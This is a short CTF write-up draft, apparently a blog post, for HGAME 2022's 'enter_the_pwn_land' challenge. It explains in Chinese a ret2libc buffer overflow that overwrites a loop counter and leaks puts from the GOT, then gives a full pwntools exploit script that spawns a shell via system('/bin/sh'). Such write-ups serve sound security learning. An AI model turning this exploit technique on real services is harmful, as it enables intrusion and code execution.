@@ -1,0 +1,32 @@
+---
+title: "HGAME wp"
+date: 2022-01-25T16:50:02+08:00
+draft: true
+---
+
+[[hgame.vidar.club][HGAME]]
+
+
+* enter_the_pwn_land
+ret2libc，但是有些小坑。循环控制变量i在字符串后面，溢出的字符会覆盖掉i。写入的第一个字节x覆盖了i后会剩下的内容会从 =s+x= 开始往后继续写入，因此需要控制写入i的内容到指定偏移。剩下的就是标准的ret2libc了。puts出puts的got拿到libcbase偏移，再构造system("/bin/sh")。注意system需要栈对齐，在前面试着加几个ret的gadget对齐栈就行。
+#+begin_src python
+from pwn import *
+context.arch="amd64"
+context.terminal = ['tmux', 'splitw', '-h', '-F', '-P']
+io = process("./a.out")
+# io = remote("chuj.top", "33705")
+# io = gdb.debug("./a.out")
+elf = ELF("./a.out")
+libc = ELF("/home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6")
+libc = ELF("./libc-2.31.so")
+# gdb.attach(io)
+io.sendline("0"*0x34+p64(0x401313)+p64(elf.got['puts'])+p64(elf.symbols['puts'])+p64(elf.symbols['main']))
+io.recvline()
+putsaddr = u64(io.recvline()[:-1].ljust(8, '\0'))
+libcbase = putsaddr - libc.symbols['puts']
+print(hex(putsaddr))
+binsh = libcbase + libc.search("/bin/sh").next()
+systemaddr = libcbase + libc.symbols['system']
+io.sendline("0"*0x34+p64(0x40101a)+p64(0x40101a)+p64(0x40101a)+p64(0x401313)+p64(binsh)+p64(systemaddr))
+io.interactive()
+#+end_src
